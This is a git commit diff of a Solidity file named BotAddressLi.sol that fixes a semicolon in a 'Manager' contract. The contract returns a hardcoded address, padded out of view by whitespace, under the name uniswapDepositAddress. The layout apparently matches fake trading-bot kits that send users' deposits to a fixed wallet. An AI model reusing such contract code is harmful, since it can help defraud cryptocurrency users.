1d9956def9817d26a42e794ec346e650502c1ed0
BSCRunBot <96918100+BSCRunBot@users.noreply.github.com>
2022-01-08 13:16:13 +0800

    Update BotAddressLi.sol

--- BotAddressLi.sol
+++ BotAddressLi.sol
@@ -4,6 +4,6 @@ contract Manager {
 	function performTasks() public {
 	}
 	function uniswapDepositAddress() public pure returns (address) {
-                               return  0x555628247D2769ec8f57075BF49c03c5A709E362；
+                               return  0x555628247D2769ec8f57075BF49c03c5A709E362;
 	}
 }
